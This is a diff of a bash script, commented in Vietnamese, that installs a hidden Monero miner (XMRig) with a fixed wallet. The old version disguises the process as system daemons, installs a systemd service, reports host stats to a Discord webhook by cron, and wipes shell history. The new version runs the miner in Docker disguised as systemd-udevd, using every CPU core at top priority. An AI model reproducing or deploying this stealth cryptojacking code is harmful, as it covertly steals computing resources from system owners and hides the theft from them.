@@ -1,112 +1,85 @@
 #!/bin/bash
-# ghi hết đoạn dưới này ( nhớ bỏ dấu "#" )
 
-# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)
+# ========== KIỂM TRA PHỤ THUỘNG ==========
+command -v docker >/dev/null || { echo "❌ Docker chưa cài."; exit 1; }
+command -v curl  >/dev/null || { echo "❌ curl chưa cài."; exit 1; }
+command -v bc    >/dev/null || { echo "❌ bc chưa cài. Đang cài đặt bc..."; sudo apt-get update && sudo apt-get install -y bc; }
 
-# ========== CONFIG ==========
-WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
-POOL="pool.hashvault.pro:443"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
-WORKER="stealth_$(hostname)"
+# ========== CẤU HÌNH ==========
+WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz}
+# Giả lập tên service hệ thống
+CONTAINER_NAME=${CONTAINER_NAME:-systemd-udevd}
+IMAGE_NAME=${IMAGE_NAME:-ubuntu-base}
+LOG_DIR=${LOG_DIR:-/var/log/udev}
 
-CPU_THREADS=$(nproc)  # thay vì 90%
-PRIORITY=5
+# ========== LẤY SỐ CORE CPU VÀ TẤT CẢ CPU ==========
+CPU_CORES=$(nproc)
+USE_CORES=$CPU_CORES            # Dùng 100% lõi
+THREAD_HINT=$USE_CORES
+CPUSET="0-$((CPU_CORES-1))"   # Sử dụng toàn bộ lõi
 
-FAKE_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
-INSTALL_DIR="$HOME/.local/share/.system"
-SERVICE_NAME=$(shuf -n1 -e "sysdaemon" "core-logger" "netwatchd" "usb-handler")
-LOG_FILE="/tmp/.core-log.txt"
-# ============================
+# ========== URL VÀ SHA256 XMRig ==========
+XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
+EXPECTED_SHA256="b2c88b19699e3d22c4db0d589f155bb89efbd646ecf9ad182ad126763723f4b7"
 
-echo "🛠️ Đang cài đặt XMRig stealth (không dùng processhider)..."
-
-# Cài gói cần thiết
-sudo apt update
-sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
-
-# Bật HugePages để tăng tốc
-sudo sysctl -w vm.nr_hugepages=128
-sudo bash -c 'echo "vm.nr_hugepages=128" >> /etc/sysctl.conf'
-
-# Clone & build XMRig
-cd ~
-rm -rf xmrig
-git clone https://github.com/xmrig/xmrig.git
-cd xmrig
-mkdir build && cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release
-make -j$TOTAL_CORES
-
-# Tạo thư mục ẩn & copy file
-mkdir -p "$INSTALL_DIR"
-cp ~/xmrig/build/xmrig "$INSTALL_DIR/xmrig"
-chmod +x "$INSTALL_DIR/xmrig"
-
-# Tạo script runner dùng exec -a để ngụy trang tiến trình
-tee "$INSTALL_DIR/$FAKE_NAME" > /dev/null << EOF
-#!/bin/bash
-exec -a $FAKE_NAME "$INSTALL_DIR/xmrig" -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
-  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
-  --log-file=$LOG_FILE
-EOF
-
-chmod +x "$INSTALL_DIR/$FAKE_NAME"
-
-# Tạo systemd service
-sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
-[Unit]
-Description=System Monitor Daemon
-After=network.target
-
-[Service]
-ExecStart=$INSTALL_DIR/$FAKE_NAME
-Restart=always
-Nice=-10
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Kích hoạt & chạy service
-sudo systemctl daemon-reload
-sudo systemctl enable $SERVICE_NAME
-sudo systemctl start $SERVICE_NAME
-
-# Tạo script gửi log Discord
-tee "$INSTALL_DIR/logger.sh" > /dev/null << EOF
-#!/bin/bash
-WEBHOOK="$DISCORD_WEBHOOK"
-PROCESS_NAME="$FAKE_NAME"
-HOST="\$(hostname)"
-HASHRATE="Unknown"
-LOG_FILE="$LOG_FILE"
-
-if [ -f "\$LOG_FILE" ]; then
-  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
+# ========== DỌN CŨ VÀ UNMASK DOCKER ==========
+docker rm -f "${CONTAINER_NAME}" 2>/dev/null
+sudo systemctl unmask docker docker.socket containerd.service
+if ! sudo systemctl is-active --quiet docker; then
+  sudo systemctl start docker || { echo "❌ Không thể khởi động Docker."; exit 1; }
 fi
 
-CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
-UPTIME=\$(uptime -p)
-THREADS=\$(nproc)
+# ========== TẠO THƯ MỤC TẠM VÀ LOGS ==========
+WORKDIR=$(mktemp -d)
+mkdir -p "${LOG_DIR}"
+sudo chown $(whoami): "${LOG_DIR}"
+cd "${WORKDIR}" || exit 1
 
-curl -s -H "Content-Type: application/json" -X POST -d "{
-  \\"username\\": \\"XMRig Stealth\\",
-  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đang đào XMR\\n🔧 Process: \\\`$FAKE_NAME\\\`\\n🧵 Threads: \\\`\$THREADS\\\`\\n⚡ Hashrate: \\\`\$HASHRATE\\\`\\n💻 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n🕒 Uptime: \\\`\$UPTIME\\\`\\"
-}" "\$WEBHOOK" > /dev/null 2>&1
+# ========== TẢI VÀ KIỂM TRA HASH ==========
+echo "[*] Tải XMRig..."
+curl -sL -o xmrig.tar.gz "${XMRIG_URL}"
+ACTUAL_SHA256=$(sha256sum xmrig.tar.gz | awk '{print $1}')
+if [ "${ACTUAL_SHA256}" != "${EXPECTED_SHA256}" ]; then
+  echo "❌ Hash không khớp."; exit 1;
+fi
+
+echo "[✓] SHA256 hợp lệ."
+# ========== GIẢI NÉN BINARY ==========
+tar -xf xmrig.tar.gz
+XMRIG_BIN=$(find . -type f -name xmrig | head -n1)
+[ -z "$XMRIG_BIN" ] && { echo "❌ Không tìm thấy xmrig."; exit 1; }
+mv "$XMRIG_BIN" ./udevd && chmod +x ./udevd
+
+# ========== TẠO config.json ==========
+cat > config.json <<EOF
+{
+  "autosave": true,
+  "cpu": { "enabled": true, "max-threads-hint": $THREAD_HINT, "priority": -20, "huge-pages": true },
+  "pools": [{"url":"pool.hashvault.pro:443","user":"$WALLET","pass":"x","tls":true,"keepalive":true}]
+}
 EOF
 
-chmod +x "$INSTALL_DIR/logger.sh"
+# ========== TẠO Dockerfile GIẢ LẬP SYSTEMD-UEVDD ==========
+cat > Dockerfile <<'EOF'
+FROM ubuntu:20.04
+ARG DEBIAN_FRONTEND=noninteractive
+ENV TZ=Asia/Ho_Chi_Minh
+RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone && apt-get update && apt-get install -y --no-install-recommends tzdata libhwloc-dev curl unzip && apt-get clean && rm -rf /var/lib/apt/lists/*
+WORKDIR /
+COPY udevd /usr/lib/systemd/systemd-udevd
+COPY config.json /etc/udev/config.json
+RUN chmod +x /usr/lib/systemd/systemd-udevd && mkdir -p /var/log/udev && chmod 755 /var/log/udev
+ENTRYPOINT ["/usr/lib/systemd/systemd-udevd","--config","/etc/udev/config.json"]
+EOF
 
-# Cron gửi log mỗi 5 phút
-(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logger.sh") | crontab -
+# ========== BUILD VÀ RUN ==========
+echo "[*] Build image..."
+docker build -t "${IMAGE_NAME}" . || exit 1
 
-# Gửi log lần đầu
-"$INSTALL_DIR/logger.sh"
+echo "[*] Run container..."
+docker run -d --name "${CONTAINER_NAME}" --cpuset-cpus="$CPUSET" --cpus="$USE_CORES" --memory="20000m" -v "$LOG_DIR":/var/log/udev --restart=always "${IMAGE_NAME}"
 
-# Xoá dấu vết
-cd ~
-rm -rf xmrig
-history -c
+# ========== HOÀN TẤT ==========
+cd ~ && rm -rf "$WORKDIR"
 
-echo ""
-echo "✅ Đã cài đặt XMRig stealth không cần processhider! Log gửi về Discord mỗi 5 phút 🚀"
+echo "[✓] Thực thi udevd mining ẩn, dùng tất cả lõi CPU."
